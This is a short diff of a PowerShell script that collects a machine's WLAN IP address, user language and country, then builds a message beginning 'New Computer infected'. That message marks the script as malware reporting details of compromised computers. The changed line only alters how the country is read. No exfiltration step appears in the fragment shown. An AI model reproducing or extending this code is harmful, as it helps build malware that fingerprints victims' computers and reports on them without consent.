@@ -12,7 +12,7 @@ catch {
     $ipWlan = 'No Wlan' 
 } 
 $language = (Get-WinUserLanguageList)[0].autonym
-$country = Get-ItemProperty 'HKCU:\Control Panel\International\Geo\' | Select-Object -exp Name
+$country = Get-WinHomeLocation | Select-Object HomeLocation
 $description = 
 "
 New Computer infected 
